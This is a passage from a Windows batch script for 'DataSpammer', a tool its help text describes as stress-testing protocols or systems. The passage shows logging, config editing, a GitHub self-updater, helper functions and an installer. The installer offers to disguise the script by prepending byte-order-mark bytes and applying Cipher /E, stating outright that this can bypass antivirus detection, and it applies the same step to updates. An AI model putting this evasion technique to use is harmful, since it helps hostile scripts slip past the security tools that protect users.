    :: Use WARN for Impactful Actions e.g. Changed Setting Foo Bar
    :: Use DEBUG for Debugging
    :: Custom Log Levels can be added
    :: In the Logfile _ and - are replaced with Spaces
    if "%logging%"=="0" exit /b
    if "%monitoring%"=="1" call :send_message "%log.content%"

    call :check_args :log "%~1"
    set "log.content=%~1"
    set "logfile=DataSpammer.log"
    
    if "%errorlevel%"=="1" ( set "log.content=ERROR" )

    :: Check Folder Structure
    set "folder=%userprofile%\Documents\DataSpammerLog"
    if not exist "%folder%" (
        mkdir "%folder%"
    )
    
    set "log.content.clean=%log.content%"
    set log.content.clean=%log.content.clean:_= %
    set log.content.clean=%log.content.clean:-= %


    for /f "tokens=1-3 delims=:." %%a in ("%time%") do set formatted_time=%%a:%%b:%%c
    echo [ DataSpammer / %~2 ][%date% - %formatted_time%]: %log.content.clean% >> "%folder%\%logfile%"
    exit /b %errorlevel%
    


:update_config
    setlocal EnableDelayedExpansion
    call :check_args :done "%~1" "%~2" "%~3"
    if "!errorlevel!"=="1" (
        !errormsg!
        exit /b 1
    )
    set "found=0"
    :: Example for Interactive Change
    :: call :update_config "default-filename" "Type in the Filename you want to use." ""
    
    :: Example for Automated Change
    :: call :update_config "logging" "" "1"
    
    :: Parameter 1: Value (logging etc.)
    :: Parameter 2: User Choice (interactive prompt, empty for automated)
    :: Parameter 3: New Value (leave empty for user input)
    
    cd /d "%~dp0"
    
    set "key=%~1"
    set "prompt=%~2"
    set "new_value=%~3"

    if "%new_value%"=="" (
        set /p "new_value=!prompt! "
    )
    
    set "file=settings.conf"
    set "tmpfile=temp.txt"
    if exist "%tmpfile%" del "%tmpfile%"
    (for /f "tokens=1,* delims==" %%a in (!file!) do (
        if "%%a"=="%key%" (
            set found=1
            echo %%a=!new_value!
        ) else (
            echo %%a=%%b
        )
    )) > !tmpfile!
    
    if "!found!"=="0" (
        echo %key%=%new_value% >> !tmpfile!
    )

    if "!logging!"=="1" call :log Changing_%key% INFO
    move /Y "!tmpfile!" "!file!" >nul
    echo Restarting...
    :: Reset the settings Hash save
    call :reset.settings.hash
    exit /b 0

:done
    :: Display Done Window
    call :check_args :done "%~1"
    if "%errorlevel%"=="1" (
        %errormsg%
    )
    cls
    echo:
    %$Echo% "   ____        _        ____                                           
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |  
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|  
    %$Echo% "                             |_|                                                                    


    
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo %~1
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo Do you want to Close the Script or Go to the Menu?
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Close
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Menu
    echo:
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto cancel
        if %_erl%==2 goto menu
    goto done

:list.vars
    :: List all Goto Signs
    cd "%~dp0"
    echo ---------------
    echo DataSpammer.bat
    echo ---------------

    for /f "delims=" %%a in ('findstr /b ":" "dataspammer.bat" ^| findstr /v "^::" ^| findstr /v "^:REM"') do (
    echo %%a
    )
    pause

:send_message
    :: Send a Message to Monitor Socket
    if "%monitoring%" NEQ "1" exit /b monitoroff
    set "socket.location=%TEMP%\socket.message"
    set "message=%~1 %~2 %~3 %~4 %~5 %~6 %~7 %~8 %~9"
    echo %message% > "%socket.location%"
    exit /b

:help.startup
    :: Display Help Message
    echo:
    echo:
    echo Dataspammer: 
    echo    Script to stress-test various Protocols or Systems
    echo    For educational purposes only.
    echo:
    echo Usage dataspammer [Argument] 
    echo       dataspammer.bat [Argument]
    echo:
    echo Parameters: 
    echo    help    Show this Help Dialog
    echo:
    echo    update  Check for Updates and exit afterwards
    echo:
    echo    faststart   Start the Script without checking for Anything 
    echo:
    echo    remove  Remove the Script and its components from your System
    echo:
    echo    start   Directly start a Spam Method
    echo:
    echo    noelev  Start the Script without Administrator
    echo:
    echo    debug   Generate Debug Log (Requires Admin / UAC)
    echo:
    echo    monitor     Opens the Monitor Socket
    echo:
    echo    update.script [ stable / beta ]     Force Update the Script
    echo:
    echo    version     Show Version
    echo:
    echo    debugtest       Verify Functionality
    echo:
    echo    install       Start the Installer
    echo:
    echo    /b      Exit while keeping CMD Window (can be combined with other Arguments)
    echo:
    echo:
    exit /b %errorlevel%

:update.script
    cls
    :: Updated in v6
    :: Old one used seperate file / wget & curl & iwr
    :: Usage: call :update.script [stable / beta]
    if %logging% == 1 ( call :log Creating_Update_Script INFO )
    call :check_args :generate_random "%~1"
    if "%errorlevel%"=="1" (
        %errormsg%
        exit /b 1
    )    
    
    :: Check Arguments
    if "%~1"=="stable" set "update_url=https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/"
    if "%~1"=="beta" set "update_url=https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/v6/"

    :: Installer Preps
    cd /d "%~dp0"
    erase README.md && erase LICENSE >nul 2>&1
    set "TMP_DIR=%temp%\dts.update"
    rd /s /q "%TMP_DIR%" 2>nul
    mkdir "%TMP_DIR%"
    echo Downloading...
    :: Download Files via BITS
    bitsadmin /transfer upd "%update_url%dataspammer.bat" "%TMP_DIR%\dataspammer.bat"
    if errorlevel 1 (
        %errormsg%
        echo Download failed. 
        exit /b 1
    )    
    bitsadmin /transfer upd "%update_url%README.md" "%TMP_DIR%\README.md"
    if errorlevel 1 (
        %errormsg%
        echo Download failed. 
        exit /b 1
    )      
    bitsadmin /transfer upd "%update_url%LICENSE" "%TMP_DIR%\LICENSE"
    if errorlevel 1 (
        %errormsg%
        echo Download failed. 
        exit /b 1
    )  
    cls
    echo Downloaded Files.

    :: Check for Certutil, Required for Encryption
    for /f "delims=" %%a in ('where certutil') do (
        set "where_output=%%a"
    )  
    if not defined where_output goto move.new.files
    :: Encrypt new Files, when current Version is already encrypted
    for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v Token 2^>nul') do set "tokenhash=%%A"
    if not defined tokenhash goto move.new.files

    echo Encrypting newly downloaded Files...
    echo FF FE 0D 0A 63 6C 73 0D 0A >  "%temp%\dts.update\temp_hex.txt"
    certutil -f -decodehex "%temp%\dts.update\temp_hex.txt" "%temp%\dts.update\temp_prefix.bin"
    move "%temp%\dts.update\dataspammer.bat" "%temp%\dts.update\original_dataspammer.bat"
    copy /b "%temp%\dts.update\temp_prefix.bin" + "%temp%\dts.update\original_dataspammer.bat" "%temp%\dts.update\dataspammer.bat"
    erase "%temp%\dts.update\original_dataspammer.bat"
    erase "%temp%\dts.update\temp_hex.txt"
    erase "%temp%\dts.update\temp_prefix.bin"
    Cipher /E "%temp%\dts.update\dataspammer.bat"

    :move.new.files
    move /Y "%TMP_DIR%\dataspammer.bat" "%~dp0dataspammer.bat"
    move /Y "%TMP_DIR%\README.md" "%~dp0README.md"
    move /Y "%TMP_DIR%\LICENSE" "%~dp0LICENSE"
    rd /s /q "%TMP_DIR%"
    cmd.exe /c "%~dp0\dataspammer.bat" update-install
    goto cancel

:version
    :: Fast Extract Version
    cd "%temp%"
    set "api_url=https://api.github.com/repos/PIRANY1/DataSpammer/releases/latest"
    curl -s %api_url% > apianswer.txt
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    set "latest_version=%latest_version:"=%"
    del apianswer.txt
    echo DataSpammer Script
    echo Version v6 (Beta)
    echo Newest Stable Release: %latest_version%
    echo: 
    exit /b %errorlevel%


:: Function description:
:: %1: type (numbers, letters, all)
:: %2: number of characters to generate
:: Example: 
:: call :generate_random all 40
:: Output: Random string: fjELw0oV2nA.nDgx4Jk1vNal,2sMS8tSYhDYAP9-
:generate_random
    call :check_args :generate_random "%~1" "%~2"
    if "%errorlevel%"=="1" (
        set "random_gen=ERROR"
        exit /b 1
    )    
    setlocal EnableDelayedExpansion
    set "type=%~1"
    set "length=%~2"
    
    :: Define allowed characters based on type
    if /I "%type%"=="numbers" (
        set "chars=0123456789"
    ) else if /I "%type%"=="letters" (
        set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    ) else if /I "%type%"=="all" (
        set "chars=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz:,.-;!?"
    ) else (
        echo Unknown type: %type%
        if "%logging%"=="1" call :log Unknown_Type_%type% ERROR
        if "%logging%"=="1" call :log Caught_At_:generate_random ERROR
        exit /b 1
    )
    
    :: Escape quotes properly in PowerShell call
    set "pscmd=powershell -NoProfile -Command \""
    set "pscmd=!pscmd!$chars='!chars!'; "
    set "pscmd=!pscmd!$len=%length%; "
    set "pscmd=!pscmd!(-join (1..$len | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] }))"
    set "pscmd=!pscmd!\""
    
    for /f "usebackq delims=" %%a in (`!pscmd!`) do (
        set "random_gen=%%a"
    )
    set "random_gen=%random_gen%"
    exit /b 0

:check_args
    :: %1 = Origin (for logging)
    :: %2+ = Arguments to check
    :: Example: call :check_args :generate_random %1 %2 ...
    
    set "i=2"
    
    :check_loop
    call set "arg=%%~%i%%"
    if "!arg!"=="" (
        %errormsg%
        echo [Error][%~1] Argument #%i% is missing. Please report this Issue on GitHub.
        echo Waiting 2 Seconds...
        call :sys.lt 4 
        if defined logging if "!logging!"=="1" (
            call :log Caught_Error: ERROR
            call :log At_:check_args ERROR
            call :log From:_%~1_#%i%_is_missing ERROR
        )
        exit /b 1
    )
    
    set /a i+=1
    call set "next=%%~%i%%"
    if defined next (
        goto :check_loop
    )
    exit /b 0
    
:: -------------------------------------------------------------------
:: Function Usage Example: TimeDifference
::
:: Description:
::   Calculates the absolute time difference between two given timestamps
::   in the format HH:MM:SS,CC (%time% format).
::
:: Arguments:
::   %1 - Start time (e.g. "21:32:22,32")
::   %2 - End time   (e.g. "21:50:22,32")
::
:: Example call:
::   call :TimeDifference "21:32:22,32" "21:50:22,32" > tmp_time.txt
::
:: Output:
::   The result (duration in MM:SS:CC format) will be written to the file "tmp_time.txt".
::   It can be loaded into a variable like this:
::       set /p diff.full=<tmp_time.txt
::       del tmp_time.txt
::
:: Example Output:
::   Diff : 18:00:00
::
:: Note:
::   This function uses only standard batch features and works even
::   when times cross over a minute/hour, but not midnight.
:: -------------------------------------------------------------------

:TimeDifference
    setlocal EnableDelayedExpansion
    call :check_args :TimeDifference "%~1" "%~2"
    if "%errorlevel%"=="1" (
        %errormsg%
        exit /b 1
    )

    :: Parse time1
    set "time1=%~1"
    set "H1=%time1:~0,2%"
    set "M1=%time1:~3,2%"
    set "S1=%time1:~6,2%"
    set "C1=%time1:~9,2%"

    :: Parse time2
    set "time2=%~2"
    set "H2=%time2:~0,2%"
    set "M2=%time2:~3,2%"
    set "S2=%time2:~6,2%"
    set "C2=%time2:~9,2%"

    :: Convert to centiseconds
    set /a total1 = (1%H1% %% 100)*360000 + (1%M1% %% 100)*6000 + (1%S1% %% 100)*100 + (1%C1% %% 100)
    set /a total2 = (1%H2% %% 100)*360000 + (1%M2% %% 100)*6000 + (1%S2% %% 100)*100 + (1%C2% %% 100)

    :: Difference
    if !total2! GEQ !total1! (
        set /a diff = total2 - total1
    ) else (
        set /a diff = total1 - total2
    )

    :: Breakdown
    set /a diffMin = diff / 6000
    set /a remainder = diff %% 6000
    set /a diffSec = remainder / 100
    set /a diffCent = remainder %% 100

    :: Format 2-digit
    if !diffMin! LSS 10 set "diffMin=0!diffMin!"
    if !diffSec! LSS 10 set "diffSec=0!diffSec!"
    if !diffCent! LSS 10 set "diffCent=0!diffCent!"

    :: Output
    echo !diffMin!:!diffSec!:!diffCent!
    exit /b

:: -------------------------------------------------------------------
:: Calculates the difference in milliseconds between two time strings.
:: Input needs to be in the specified Format (or from %time%)
:: Arguments:
::   %1 - Start time (e.g. "21:32:22,32")
::   %2 - End time   (e.g. "21:50:22,32")
:: Output:
::   Sets the variable 'timeDiffMs' to the difference in milliseconds.
::
:: Example: 
:: call :TimeDiffInMs "21:32:22,32" "21:50:22,32"
:: echo Time difference: %timeDiffMs% ms
:: exit /b 0
:: -------------------------------------------------------------------
:TimeDiffInMs
    call :check_args :TimeDiffInMs "%~1" "%~2"
    if "%errorlevel%"=="1" (
        set "timeDiffMs=ERROR"
        exit /b 1
    )

    set "start=%~1"
    set "end=%~2"

    :: Check for delimiter (, or .)
    echo(%start% | find "," >nul && set "delim=," || set "delim=."

    for /f "tokens=1-4 delims=:%%delim%%" %%a in ("%start%") do (
        set /a "startMs = (((%%a * 60 + %%b) * 60 + %%c) * 1000 + %%d * 10)"
    )

    for /f "tokens=1-4 delims=:%%delim%%" %%a in ("%end%") do (
        set /a "endMs = (((%%a * 60 + %%b) * 60 + %%c) * 1000 + %%d * 10)"
    )

    set /a "timeDiffMs=endMs - startMs"
    exit /b


:loading.animation
    :: Display Loading Animation, currently unused
    set "count=%~1"
    set "wait=1"
    set "spinner=|/-\"
    
    :main_loop
    for /L %%C in (1,1,%count%) do (
        for %%A in (0 1 2 3) do (
            cls
            set "char=!spinner:~%%A,1!"
            echo !char!
            powershell -command "Start-Sleep -Milliseconds %wait%"
        )
    )
    exit /b

:standby
    :: Display Standby Screen & Exit after 10 minutes
    cls
    echo ==================================================
    %$Echo% "    ____  _                  _ _
    %$Echo% "   / ___|| |_ __ _ _ __   __| | |__  _   _
    %$Echo% "   \___ \| __/ _` | '_ \ / _` | '_ \| | | |
    %$Echo% "    ___) | || (_| | | | | (_| | |_) | |_| |
    %$Echo% "   |____/ \__\__,_|_| |_|\__,_|_.__/ \__, |
    %$Echo% "                                     |___/
    echo --------------------------------------------------
    echo The script has entered standby after 2 minutes of inactivity.
    echo Press any key to continue...
    echo (The script will auto-exit in 10 minutes if no key is pressed)
    echo ==================================================

    timeout /t 600 >nul
    if errorlevel 1 (
        echo Timeout reached. Exiting...
        goto cancel
    )
    
    echo Resuming...
    exit /b 0

:win.version.check
    :: Check for Windows Edition, OSType, Version and Build Number
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ProductName"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSEdition=%%X
    Set OSEdition=%OSEdition:*REG_SZ    =%
    If Defined ProgramFiles(x86) ( Set OSType=x64 ) Else ( Set OSType=x86 )
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSVersion=%%X
    Set OSVersion=%OSVersion:*REG_SZ    =%
    If %OSVersion% LSS 2009 GoTo BuildNo
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "DisplayVersion"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSVersion=%%X
    Set OSVersion=%OSVersion:*REG_SZ    =%
    :BuildNo
    Set UseExpresssion=Ver
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSBuild=%%X
    Set OSBuild=%OSBuild:*10.0.=%
    Set OSBuild=%OSBuild:~0,-1%
    
    :: %OSEdition%
    :: Type: %OSType%
    :: Version: %OSVersion%
    :: Build: %OSBuild%
    exit /b 0



:sys.verify.execution
    :: Check for Human Input by asking for random Int Input
    if %logging% == 1 ( call :log Opened_verify_tab INFO )
    if "%skip-sec%"=="1" ( exit /b %errorlevel%)
    call :generateRandom
    set "verify=%realrandom% "
    %powershell.short% -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Please enter Code %verify% to confirm that you want to execute this Option', 'DataSpammer Verify')}" > %TEMP%\out.tmp
    set /p OUT=<%TEMP%\out.tmp
    :: Fix Empty Input Bypass
    if not defined OUT goto failed
    if %verify%==%OUT% ( goto success ) else ( goto failed )

:success
    :: Auth Success Popup
    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Success', 'DataSpammer Verify');}"
    %powershell.short% -Command %msgBoxArgs%
    exit /b

:failed
    :: Auth Failed Popup
    set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('You have entered the wrong Code. Please try again', 'DataSpammer Verify');}"
    %powershell.short% -Command %msgBoxArgs%
    goto sys.verify.execution


:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: -------------------------------------------------DataSpammer.bat  <- Transition -> Install.bat----------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------

:installer.main.window
    if exist "%~dp0\install.bat" ( goto v6.port )
    :: Check Elevation
    net session >nul 2>&1
    if %errorLevel% neq 0 (
        %powershell.short% -Command "Start-Process '%~f0' -Verb runAs"
        goto cancel
    )

    @title DataSpammer - Install
    %$Echo% "   ____        _        ____
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|
    %$Echo% "                             |_|


    echo Made by PIRANY - %current-script-version% - Batch
    echo:
    call :sys.lt 1
    echo This Installer will lead you through the process of installing the DataSpammer Utility.
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Use Program Files as Installation Directory 
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Use Custom Directory
    echo: 
    call :sys.lt 1
    echo:
    echo:
    call :sys.lt 1
    choice /C 12S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 set "directory=%ProgramFiles%"
        if %_erl%==2 set /p directory=Enter the Directory:
        if %_erl%==3 call :standby
    if not defined directory ( goto installer.main.window )

    :: Add Backslash if not present
    if not "%directory:~-1%"=="\" set "directory=%directory%\"

    cd /d "%directory%"
    :: Check RW Permissions
    echo: > "%directory%\testfile"
    if not exist "%directory%\testfile" (
        %errormsg%
        echo Directory not found or not writable.
        echo Waiting 4 Seconds...
        call :sys.lt 5
        goto installer.main.window
    )

    set "startmenushortcut=Not Included"
    set "desktopicon=Not Included"
    set "addpath=Not Included"

:installer.menu.select
    echo Some Files may get flagged as Malware by Antivirus Software.
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo The script will install itself in the following directory: %directory%
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] (%startmenushortcut%) Startmenu Shortcut/All Apps List 
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [2] (%desktopicon%) Desktop Shortcut
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [3] (%addpath%) Add to Path
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Done/Skip
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] De-select All Options
    echo:
    echo:
    choice /C 12345S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 cls && set "startmenushortcut=Included" && set "startmenushortcut1=1" && goto installer.menu.select
        if %_erl%==2 cls && set "desktopicon=Included" && set "desktopic1=1" && goto installer.menu.select
        if %_erl%==3 cls && set "addpath=Included" && set "addpath1=1" && goto installer.menu.select
        if %_erl%==4 goto installer.start.copy
        if %_erl%==5 set "startmenushortcut=Not Included" && set "desktopicon=Not Included" && set "addpath=Not Included" && goto installer.menu.select
        if %_erl%==6 call :standby
    goto installer.menu.select

:installer.start.copy
    :: Resync Time to avoid issues with BITS
    w32tm /resync >nul 2>&1 
    :: Main Install Code
    set "directory9=%directory%DataSpammer\"
    mkdir "%directory9%" 
    cd /d "%~dp0"
    copy "%~dp0dataspammer.bat" "%directory9%\" >nul 2>&1
    move "%~dp0README.md" "%directory9%\" >nul 2>&1
    move "%~dp0LICENSE" "%directory9%\" >nul 2>&1

    :: Download LICENSE and README.md if only dataspammer.bat is present
    cd /d "%directory9%"
    set "update_url=https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/"
    echo Downloading...
    :: Download Files via BITS
    if not exist README.md ( 
        echo Downloading README.md...
        bitsadmin /transfer upd "%update_url%README.md" "%directory9%\README.md" >nul
        if errorlevel 1 (
            %errormsg%
            echo README.md Download failed. This is not critical.
            call :sys.lt 5
        )   
    )

    if not exist LICENSE (
        echo Downloading LICENSE...
        bitsadmin /transfer upd "%update_url%LICENSE" "%directory9%\LICENSE" >nul
        if errorlevel 1 (
            %errormsg%
            echo LICENSE Download failed. This is not critical.
            call :sys.lt 5
        )  
    )

    :: Add Script to Windows App List
    set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    if defined ProgramFiles(x86) (
        set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\DataSpammer"
    )
    reg add "%RegPath%" /v "DisplayName" /d "DataSpammer" /f
    reg add "%RegPath%" /v "DisplayVersion" /d "%current-script-version%" /f
    reg add "%RegPath%" /v "InstallLocation" /d "%directory9%" /f
    reg add "%RegPath%" /v "Publisher" /d "PIRANY1" /f
    reg add "%RegPath%" /v "UninstallString" /d "%directory9%\dataspammer.bat remove" /f

    :: Add Reg Key - Remember Installed Status
    reg add "HKCU\Software\DataSpammer" /v Installed /t REG_DWORD /d 1 /f

    :: Create settings.conf
    echo: > "%directory9%\settings.conf"
    set "content=:: DataSpammer configuration
    :: Standard Filename
    default_filename=notused
    :: Standard Directory
    default_directory=notused
    :: Check for Updates
    update=1
    :: Logging is on by default
    logging=1
    :: Developer Mode
    developermode=0
    :: Default Filecount
    default-filecount=notused
    :: Default Domain
    default-domain=notused
    :: Elevation Method used (pwsh / sudo / gsudo)
    elevation=pwsh
    :: Change Monitoring Socket
    monitoring=0
    :: Change Color - Default 02 (CMD Coloring)
    color=02
    :: Skip Security Question
    skip-sec=0
    :: Set Custom Codepage (Advanced)
    chcp=0"
    :: Write to File
    (
        for %%A in ("!content!") do (
            echo %%~A
        )
    ) > "%directory9%\settings.conf"    

    :: Create Startmenu Shortcut
    if defined startmenushortcut1 (
        echo "%directory9%\dataspammer.bat" %* > "%ProgramData%\Microsoft\Windows\Start Menu\Programs\DataSpammer.bat"
    )
    :: Create Desktop Icon w. pre defined Variables
    set "targetShortcut=%USERPROFILE%\Desktop\DataSpammer.lnk"
    set "targetPath=%directory9%\DataSpammer.bat"
    if defined desktopic1 (
        %powershell.short% -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%targetShortcut%'); $Shortcut.TargetPath = '%targetPath%'; $Shortcut.Save()"
    ) >nul 


    :: Add Script to PATH
    if defined addpath1 ( setx PATH "%PATH%;%directory9%\DataSpammer.bat" /M >nul )

:sys.main.installer.done
    :: Encrypt Dialog
    echo Do you want to encrypt the Script Files?
    call :sys.lt 1
    echo This can bypass Antivirus Detections.
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Yes
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] No
    call :sys.lt 1
    echo:
    choice /C 12 /M "1/2:"
        set _erl=%errorlevel%
        if %_erl%==1 goto encrypt.script
        if %_erl%==2 goto finish.installation
    goto sys.main.installer.done

:v6.port
    :: Port to V6, add Registry Keys
    echo Porting to V6...
    echo Adding Registry Key...
    reg add "HKCU\Software\DataSpammer" /v Installed /t REG_DWORD /d 1 /f
    reg add "HKCU\Software\DataSpammer" /v Version /t REG_SZ /d "%current-script-version%" /f
    call :reset.settings.hash
    echo Done. 
    echo Consider reinstalling the Script to avoid any issues. 
    goto restart.script

:encrypt.script
    :: Encrypt Script Files, bypass Antivirus Detection
    for /f "delims=" %%a in ('where certutil') do (
        set "where_output=%%a"
    )  
    if not defined where_output goto finish.installation
    call :generateRandom
    reg add "HKCU\Software\DataSpammer" /v Token /t REG_SZ /d "%realrandom%" /f
    (
        @echo off
        echo FF FE 0D 0A 63 6C 73 0D 0A > "%directory9%\temp_hex.txt"
        certutil -f -decodehex "%directory9%\temp_hex.txt" "%directory9%\temp_prefix.bin"
        move "%directory9%\dataspammer.bat" "%directory9%\original_dataspammer.bat"
        copy /b "%directory9%\temp_prefix.bin" + "%directory9%\original_dataspammer.bat" "%directory9%\dataspammer.bat"
        erase "%directory9%\temp_hex.txt"
        erase "%directory9%\temp_prefix.bin"
        Cipher /E "%directory9%\dataspammer.bat"
        cmd /c "%directory9%\dataspammer.bat"
        erase "%directory9%\encrypt.bat"
        exit %errorlevel%
    ) > "%directory9%\encrypt.bat"
     
    start %powershell.short% -Command "Start-Process '%directory9%\encrypt.bat' -Verb runAs"
    goto cancel


:finish.installation
    :: Restart Script Process 
    echo Finished Installation.
    echo Starting...
    cmd /c "%directory9%\dataspammer.bat"
    erase "%~dp0\dataspammer.bat" > nul
    goto cancel


:cancel 
    :: Exit Script, compatible with NT
    EVENTCREATE /T INFORMATION /ID 200 /L APPLICATION /SO DataSpammer /D "DataSpammer Exiting %ERRORLEVEL%"
    set EXIT_CODE=%ERRORLEVEL%
    if not "%~1"=="" set "EXIT_CODE=%~1"
    if "%EXIT_CODE%"=="" set EXIT_CODE=0
    if "%OS%"=="Windows_NT" endlocal
    echo: > %temp%\DataSpammerClose.txt
    erase "%~dp0\dataspammer.lock" >nul 2>&1
    popd
    exit %b.flag%%EXIT_CODE%

goto cancel
exit %errorlevel%

:: Leave empty line below 
